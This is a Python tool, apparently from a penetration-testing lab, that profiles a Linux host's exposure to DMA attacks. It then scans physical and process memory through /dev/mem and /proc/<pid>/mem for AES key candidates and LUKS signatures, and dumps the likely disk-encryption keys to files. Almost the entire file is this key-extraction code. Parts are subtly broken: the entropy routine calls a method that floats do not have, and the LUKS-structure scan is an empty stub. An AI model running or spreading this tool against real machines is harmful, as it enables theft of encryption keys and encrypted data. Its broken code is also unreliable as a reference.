#!/usr/bin/env python3
"""
DMA Attack Simulator for LUKS VMK Extraction
Simulates Direct Memory Access attacks using PCILeech-style techniques

Author: Penetration Testing Lab
Target: LUKS VMK in system memory via DMA channels
Attack Vector: PCIe/Thunderbolt DMA bypass
"""

import subprocess
import os
import sys
import re
import time
import argparse
from pathlib import Path
from typing import Dict, List, Optional

class DMAAttackSimulator:
    """DMA attack simulation for LUKS key extraction"""
    
    def __init__(self):
        self.dma_tools = {
            'pcileech': '/usr/local/bin/pcileech',
            'volatility': '/usr/bin/vol.py',
            'rekall': '/usr/bin/rekall',
            'lkd': '/usr/bin/lkd'
        }
        
        self.dma_devices = [
            '/dev/fpga',       # PCILeech FPGA device
            '/dev/uio0',       # Generic UIO device
            '/dev/mem',        # Direct memory (if IOMMU disabled)
        ]
        
        self.iommu_bypass_techniques = [
            'pre_boot_dma',
            'bme_manipulation', 
            'iommu_fault_injection',
            'dma_remapping_bypass'
        ]
    
    def check_dma_prerequisites(self) -> Dict[str, bool]:
        """Check DMA attack prerequisites and system vulnerabilities"""
        status = {}
        
        # Check IOMMU status
        status['iommu_enabled'] = self._check_iommu_status()
        status['vtd_enabled'] = self._check_vtd_status()
        
        # Check for DMA-capable ports
        status['thunderbolt_ports'] = self._check_thunderbolt_ports()
        status['pcie_slots'] = self._check_pcie_slots()
        status['usb4_ports'] = self._check_usb4_ports()
        
        # Check for DMA protection
        status['kernel_dma_protection'] = self._check_kernel_dma_protection()
        status['secure_boot'] = self._check_secure_boot_status()
        
        # Check for vulnerable drivers
        status['vulnerable_drivers'] = self._check_vulnerable_drivers()
        
        # Check memory layout
        status['physical_memory_accessible'] = self._check_physical_memory_access()
        
        return status
    
    def _check_iommu_status(self) -> bool:
        """Check if IOMMU is enabled and configured"""
        try:
            # Check dmesg for IOMMU messages
            result = subprocess.run(['dmesg'], capture_output=True, text=True)
            dmesg_output = result.stdout.lower()
            
            iommu_indicators = [
                'iommu: default domain type',
                'dmar: intel(r) virtualization technology for directed i/o',
                'amd-vi: amd iommu',
                'iommu group'
            ]
            
            return any(indicator in dmesg_output for indicator in iommu_indicators)
            
        except Exception:
            return False
    
    def _check_vtd_status(self) -> bool:
        """Check Intel VT-d status"""
        try:
            with open('/proc/cmdline', 'r') as f:
                cmdline = f.read()
            
            # Check for VT-d enabling parameters
            vtd_params = ['intel_iommu=on', 'iommu=pt', 'iommu=force']
            return any(param in cmdline for param in vtd_params)
            
        except Exception:
            return False
    
    def _check_thunderbolt_ports(self) -> List[str]:
        """Check for Thunderbolt ports (DMA-capable)"""
        thunderbolt_devices = []
        
        try:
            # Check for Thunderbolt controllers
            result = subprocess.run(['lspci', '-nn'], capture_output=True, text=True)
            
            for line in result.stdout.split('\n'):
                if 'thunderbolt' in line.lower() or 'usb4' in line.lower():
                    thunderbolt_devices.append(line.strip())
            
            # Check for Thunderbolt domain directories
            tb_path = Path('/sys/bus/thunderbolt/devices')
            if tb_path.exists():
                for device in tb_path.iterdir():
                    if device.is_dir():
                        thunderbolt_devices.append(str(device.name))
            
        except Exception:
            pass
        
        return thunderbolt_devices
    
    def _check_pcie_slots(self) -> List[str]:
        """Check for PCIe slots that could be used for DMA attacks"""
        pcie_slots = []
        
        try:
            result = subprocess.run(['lspci', '-tv'], capture_output=True, text=True)
            
            for line in result.stdout.split('\n'):
                if 'pci bridge' in line.lower() or 'pcie' in line.lower():
                    pcie_slots.append(line.strip())
                    
        except Exception:
            pass
        
        return pcie_slots
    
    def _check_usb4_ports(self) -> List[str]:
        """Check for USB4 ports (Thunderbolt 4 compatible)"""
        usb4_ports = []
        
        try:
            result = subprocess.run(['lsusb', '-t'], capture_output=True, text=True)
            
            for line in result.stdout.split('\n'):
                if 'usb4' in line.lower() or '40000m' in line:  # USB4 speed
                    usb4_ports.append(line.strip())
                    
        except Exception:
            pass
        
        return usb4_ports
    
    def _check_kernel_dma_protection(self) -> bool:
        """Check for kernel DMA protection mechanisms"""
        try:
            # Check for DMA protection in kernel config
            config_files = [
                '/boot/config-' + os.uname().release,
                '/proc/config.gz'
            ]
            
            protection_configs = [
                'CONFIG_INTEL_IOMMU=y',
                'CONFIG_INTEL_IOMMU_DEFAULT_ON=y', 
                'CONFIG_AMD_IOMMU=y',
                'CONFIG_SWIOTLB=y'
            ]
            
            for config_file in config_files:
                if Path(config_file).exists():
                    try:
                        if config_file.endswith('.gz'):
                            result = subprocess.run(['zcat', config_file], 
                                                  capture_output=True, text=True)
                        else:
                            with open(config_file, 'r') as f:
                                result = type('Result', (), {'stdout': f.read()})()
                        
                        config_content = result.stdout
                        return any(config in config_content for config in protection_configs)
                        
                    except Exception:
                        continue
            
            return False
            
        except Exception:
            return False
    
    def _check_secure_boot_status(self) -> bool:
        """Check if Secure Boot is enabled"""
        try:
            secure_boot_path = Path('/sys/firmware/efi/efivars/SecureBoot-8be4df61-93ca-11d2-aa0d-00e098032b8c')
            
            if secure_boot_path.exists():
                with open(secure_boot_path, 'rb') as f:
                    data = f.read()
                    # Secure Boot status is in the last byte
                    return data[-1] == 1
            
            return False
            
        except Exception:
            return False
    
    def _check_vulnerable_drivers(self) -> List[str]:
        """Check for drivers vulnerable to DMA attacks"""
        vulnerable_drivers = []
        
        try:
            result = subprocess.run(['lsmod'], capture_output=True, text=True)
            loaded_modules = result.stdout
            
            # List of drivers known to have DMA vulnerabilities
            vulnerable_patterns = [
                'pcieport',      # PCIe port driver
                'thunderbolt',   # Thunderbolt driver
                'nouveau',       # NVIDIA driver (some versions)
                'radeon',        # AMD GPU driver
                'i915',          # Intel GPU driver
                'xhci_hcd',      # USB 3.0 controller
                'ehci_hcd',      # USB 2.0 controller
            ]
            
            for pattern in vulnerable_patterns:
                if pattern in loaded_modules:
                    vulnerable_drivers.append(pattern)
                    
        except Exception:
            pass
        
        return vulnerable_drivers
    
    def _check_physical_memory_access(self) -> bool:
        """Check if physical memory is accessible via DMA"""
        try:
            # Try to read from /dev/mem (requires root and no IOMMU protection)
            if os.geteuid() == 0 and Path('/dev/mem').exists():
                try:
                    with open('/dev/mem', 'rb') as f:
                        # Try to read first page
                        f.read(4096)
                    return True
                except (PermissionError, OSError):
                    return False
            
            return False
            
        except Exception:
            return False
    
    def simulate_pcileech_attack(self, target_pid: int = None, 
                               output_dir: str = "/tmp/dma_attack") -> Dict:
        """Simulate PCILeech-style DMA attack"""
        
        print("[INFO] Simulating PCILeech DMA attack...")
        
        results = {
            'attack_type': 'PCILeech_Simulation',
            'target_pid': target_pid,
            'success': False,
            'findings': [],
            'memory_regions': [],
            'extracted_data': []
        }
        
        # Create output directory
        Path(output_dir).mkdir(exist_ok=True)
        
        # Phase 1: Memory mapping and process discovery
        if target_pid:
            memory_regions = self._map_target_process_memory(target_pid)
            results['memory_regions'] = memory_regions
        else:
            # Scan for cryptsetup/dm-crypt processes
            crypto_processes = self._find_crypto_processes()
            results['crypto_processes'] = crypto_processes
        
        # Phase 2: Memory pattern scanning
        key_patterns = self._scan_for_key_patterns(target_pid)
        results['findings'].extend(key_patterns)
        
        # Phase 3: LUKS-specific memory structures
        luks_structures = self._scan_for_luks_structures(target_pid)
        results['findings'].extend(luks_structures)
        
        # Phase 4: Extract potential keys
        if results['findings']:
            extracted = self._extract_potential_keys(results['findings'], output_dir)
            results['extracted_data'] = extracted
            results['success'] = len(extracted) > 0
        
        return results
    
    def _map_target_process_memory(self, pid: int) -> List[Dict]:
        """Map memory regions of target process"""
        memory_regions = []
        
        try:
            maps_file = f'/proc/{pid}/maps'
            if Path(maps_file).exists():
                with open(maps_file, 'r') as f:
                    for line in f:
                        parts = line.strip().split()
                        if len(parts) >= 6:
                            addr_range = parts[0]
                            permissions = parts[1]
                            
                            # Parse address range
                            start_addr, end_addr = addr_range.split('-')
                            
                            memory_regions.append({
                                'start': int(start_addr, 16),
                                'end': int(end_addr, 16),
                                'size': int(end_addr, 16) - int(start_addr, 16),
                                'permissions': permissions,
                                'backing_file': parts[5] if len(parts) > 5 else '[anonymous]'
                            })
            
        except Exception as e:
            print(f"[ERROR] Failed to map process memory: {e}")
        
        return memory_regions
    
    def _find_crypto_processes(self) -> List[Dict]:
        """Find running cryptographic processes"""
        crypto_processes = []
        
        try:
            result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
            
            crypto_keywords = ['cryptsetup', 'dm-crypt', 'luks', 'veracrypt', 'truecrypt']
            
            for line in result.stdout.split('\n'):
                for keyword in crypto_keywords:
                    if keyword in line.lower():
                        parts = line.split()
                        if len(parts) >= 11:
                            crypto_processes.append({
                                'pid': int(parts[1]),
                                'user': parts[0],
                                'cpu': parts[2],
                                'mem': parts[3],
                                'command': ' '.join(parts[10:])
                            })
                        break
        
        except Exception as e:
            print(f"[ERROR] Failed to find crypto processes: {e}")
        
        return crypto_processes
    
    def _scan_for_key_patterns(self, target_pid: int = None) -> List[Dict]:
        """Scan memory for cryptographic key patterns"""
        patterns = []
        
        # AES key patterns (high entropy, specific sizes)
        aes_key_sizes = [16, 24, 32]  # AES-128, AES-192, AES-256
        
        if target_pid:
            # Scan specific process memory
            mem_file = f'/proc/{target_pid}/mem'
            if Path(mem_file).exists():
                try:
                    regions = self._map_target_process_memory(target_pid)
                    patterns.extend(self._scan_memory_regions(mem_file, regions))
                except Exception as e:
                    print(f"[ERROR] Failed to scan process memory: {e}")
        else:
            # Scan system memory (requires special privileges)
            if os.geteuid() == 0:
                patterns.extend(self._scan_system_memory())
        
        return patterns
    
    def _scan_memory_regions(self, mem_file: str, regions: List[Dict]) -> List[Dict]:
        """Scan specific memory regions for key patterns"""
        patterns = []
        
        try:
            with open(mem_file, 'rb') as f:
                for region in regions:
                    # Only scan readable, writable regions
                    if 'r' in region['permissions'] and region['size'] < 100 * 1024 * 1024:  # Skip huge regions
                        try:
                            f.seek(region['start'])
                            data = f.read(region['size'])
                            
                            region_patterns = self._analyze_memory_chunk(
                                data, region['start'], f"PID_{os.getpid()}_region"
                            )
                            patterns.extend(region_patterns)
                            
                        except (OSError, IOError):
                            # Region not accessible
                            continue
                            
        except Exception as e:
            print(f"[ERROR] Memory region scanning failed: {e}")
        
        return patterns
    
    def _scan_system_memory(self) -> List[Dict]:
        """Scan system memory for key patterns (requires root)"""
        patterns = []
        
        try:
            # Use /dev/mem if available
            if Path('/dev/mem').exists():
                with open('/dev/mem', 'rb') as f:
                    # Scan first 1GB of physical memory in chunks
                    chunk_size = 1024 * 1024  # 1MB chunks
                    offset = 0
                    max_scan = 1024 * 1024 * 1024  # 1GB
                    
                    while offset < max_scan:
                        try:
                            f.seek(offset)
                            chunk = f.read(chunk_size)
                            
                            if not chunk:
                                break
                            
                            chunk_patterns = self._analyze_memory_chunk(
                                chunk, offset, "physical_memory"
                            )
                            patterns.extend(chunk_patterns)
                            
                            offset += len(chunk)
                            
                        except (OSError, IOError):
                            offset += chunk_size
                            continue
            
        except Exception as e:
            print(f"[ERROR] System memory scanning failed: {e}")
        
        return patterns
    
    def _analyze_memory_chunk(self, data: bytes, base_offset: int, 
                            source: str) -> List[Dict]:
        """Analyze memory chunk for cryptographic patterns"""
        patterns = []
        
        # Look for AES keys (high entropy regions of specific sizes)
        aes_sizes = [16, 24, 32]
        
        for size in aes_sizes:
            for i in range(len(data) - size):
                candidate = data[i:i + size]
                
                if self._is_potential_aes_key(candidate):
                    patterns.append({
                        'type': 'AES_KEY_CANDIDATE',
                        'offset': base_offset + i,
                        'size': size,
                        'data': candidate.hex(),
                        'entropy': self._calculate_entropy(candidate),
                        'source': source
                    })
        
        # Look for LUKS magic signatures
        luks_signatures = [
            b'LUKS\xba\xbe',  # LUKS1
            b'SKUL\xba\xbe',  # LUKS2
        ]
        
        for signature in luks_signatures:
            offset = data.find(signature)
            while offset != -1:
                patterns.append({
                    'type': 'LUKS_SIGNATURE',
                    'offset': base_offset + offset,
                    'signature': signature.hex(),
                    'context': data[offset:offset + 64].hex(),
                    'source': source
                })
                
                offset = data.find(signature, offset + 1)
        
        return patterns
    
    def _is_potential_aes_key(self, data: bytes) -> bool:
        """Check if data could be an AES key"""
        if len(data) < 16:
            return False
        
        # Check entropy
        entropy = self._calculate_entropy(data)
        if entropy < 6.0:  # Threshold for randomness
            return False
        
        # Check for patterns that suggest it's not a key
        unique_bytes = len(set(data))
        if unique_bytes < len(data) // 2:  # Too many repeated bytes
            return False
        
        # Check for null bytes (uncommon in real keys)
        null_count = data.count(0)
        if null_count > len(data) // 4:
            return False
        
        return True
    
    def _calculate_entropy(self, data: bytes) -> float:
        """Calculate Shannon entropy"""
        if not data:
            return 0
        
        frequencies = [0] * 256
        for byte in data:
            frequencies[byte] += 1
        
        entropy = 0.0
        length = len(data)
        
        for count in frequencies:
            if count > 0:
                probability = count / length
                entropy -= probability * (probability.bit_length() - 1)
        
        return entropy
    
    def _scan_for_luks_structures(self, target_pid: int = None) -> List[Dict]:
        """Scan for LUKS-specific data structures in memory"""
        structures = []
        
        # LUKS header patterns
        luks_patterns = [
            b'dm-crypt',
            b'crypt_',
            b'luks',
            b'cipher',
            b'keyslot',
            b'pbkdf2',
            b'argon2',
            b'sha256',
            b'aes-xts-plain64'
        ]
        
        # This would be implemented similar to _scan_for_key_patterns
        # but looking for LUKS-specific structures
        
        return structures
    
    def _extract_potential_keys(self, findings: List[Dict], 
                              output_dir: str) -> List[str]:
        """Extract potential keys from findings"""
        extracted_files = []
        
        output_path = Path(output_dir)
        
        # Sort by entropy (higher is better)
        key_candidates = [f for f in findings if f['type'] == 'AES_KEY_CANDIDATE']
        key_candidates.sort(key=lambda x: x.get('entropy', 0), reverse=True)
        
        for i, candidate in enumerate(key_candidates[:20]):  # Top 20 candidates
            key_file = output_path / f"dma_extracted_key_{i:02d}.bin"
            
            with open(key_file, 'wb') as f:
                f.write(bytes.fromhex(candidate['data']))
            
            # Create metadata
            meta_file = output_path / f"dma_extracted_key_{i:02d}.json"
            with open(meta_file, 'w') as f:
                import json
                json.dump(candidate, f, indent=2)
            
            extracted_files.append(str(key_file))
        
        return extracted_files
    
    def analyze_dma_vulnerabilities(self) -> Dict:
        """Analyze system for DMA attack vulnerabilities"""
        
        print("[INFO] Analyzing DMA attack surface...")
        
        analysis = {
            'vulnerability_score': 0,
            'attack_vectors': [],
            'mitigations_present': [],
            'recommendations': []
        }
        
        prerequisites = self.check_dma_prerequisites()
        
        # Calculate vulnerability score
        score = 0
        
        # IOMMU protection
        if not prerequisites.get('iommu_enabled', False):
            score += 30
            analysis['attack_vectors'].append('IOMMU_DISABLED')
        else:
            analysis['mitigations_present'].append('IOMMU_ENABLED')
        
        # VT-d protection
        if not prerequisites.get('vtd_enabled', False):
            score += 20
            analysis['attack_vectors'].append('VTD_DISABLED')
        else:
            analysis['mitigations_present'].append('VTD_ENABLED')
        
        # DMA-capable ports
        if prerequisites.get('thunderbolt_ports', []):
            score += 25
            analysis['attack_vectors'].append('THUNDERBOLT_AVAILABLE')
        
        if prerequisites.get('pcie_slots', []):
            score += 15
            analysis['attack_vectors'].append('PCIE_SLOTS_AVAILABLE')
        
        # Kernel DMA protection
        if not prerequisites.get('kernel_dma_protection', False):
            score += 20
            analysis['attack_vectors'].append('NO_KERNEL_DMA_PROTECTION')
        else:
            analysis['mitigations_present'].append('KERNEL_DMA_PROTECTION')
        
        # Physical memory access
        if prerequisites.get('physical_memory_accessible', False):
            score += 40
            analysis['attack_vectors'].append('PHYSICAL_MEMORY_ACCESSIBLE')
        
        analysis['vulnerability_score'] = min(score, 100)
        
        # Generate recommendations
        if score > 70:
            analysis['recommendations'].append('CRITICAL: Enable IOMMU in BIOS/UEFI')
            analysis['recommendations'].append('CRITICAL: Enable VT-d/AMD-Vi')
            analysis['recommendations'].append('HIGH: Disable unused DMA-capable ports')
        elif score > 40:
            analysis['recommendations'].append('MEDIUM: Review DMA security settings')
            analysis['recommendations'].append('MEDIUM: Enable additional kernel protections')
        
        return analysis


def main():
    parser = argparse.ArgumentParser(description='DMA Attack Simulator for LUKS VMK Extraction')
    parser.add_argument('action', choices=['check', 'analyze', 'attack', 'scan'])
    parser.add_argument('-p', '--pid', type=int, help='Target process ID')
    parser.add_argument('-o', '--output', default='/tmp/dma_attack', help='Output directory')
    parser.add_argument('--system-scan', action='store_true', help='Scan system memory (requires root)')
    
    args = parser.parse_args()
    
    simulator = DMAAttackSimulator()
    
    if args.action == 'check':
        print("Checking DMA attack prerequisites...")
        prerequisites = simulator.check_dma_prerequisites()
        
        print("\n[DMA ATTACK SURFACE ANALYSIS]")
        
        for check, status in prerequisites.items():
            if isinstance(status, bool):
                symbol = "✓" if status else "✗"
                color = "GREEN" if status else "RED"
                print(f"{symbol} {check}: {status}")
            elif isinstance(status, list):
                print(f"• {check}: {len(status)} found")
                for item in status[:3]:  # Show first 3 items
                    print(f"    - {item}")
                if len(status) > 3:
                    print(f"    ... and {len(status) - 3} more")
    
    elif args.action == 'analyze':
        analysis = simulator.analyze_dma_vulnerabilities()
        
        print(f"\n[VULNERABILITY ANALYSIS]")
        print(f"Vulnerability Score: {analysis['vulnerability_score']}/100")
        
        if analysis['attack_vectors']:
            print(f"\nAttack Vectors:")
            for vector in analysis['attack_vectors']:
                print(f"  • {vector}")
        
        if analysis['mitigations_present']:
            print(f"\nMitigations Present:")
            for mitigation in analysis['mitigations_present']:
                print(f"  • {mitigation}")
        
        if analysis['recommendations']:
            print(f"\nRecommendations:")
            for rec in analysis['recommendations']:
                print(f"  • {rec}")
    
    elif args.action == 'attack':
        if args.system_scan and os.geteuid() != 0:
            print("[ERROR] System memory scan requires root privileges")
            return
        
        results = simulator.simulate_pcileech_attack(args.pid, args.output)
        
        print(f"\n[DMA ATTACK SIMULATION RESULTS]")
        print(f"Attack Type: {results['attack_type']}")
        print(f"Success: {results['success']}")
        print(f"Findings: {len(results['findings'])}")
        
        if results.get('extracted_data'):
            print(f"Extracted Keys: {len(results['extracted_data'])}")
            print(f"Output Directory: {args.output}")
    
    elif args.action == 'scan':
        print("[INFO] Scanning for crypto processes...")
        processes = simulator._find_crypto_processes()
        
        if processes:
            print(f"\nFound {len(processes)} crypto-related processes:")
            for proc in processes:
                print(f"  PID {proc['pid']}: {proc['command']} (User: {proc['user']})")
        else:
            print("No crypto-related processes found")


if __name__ == "__main__":
    main()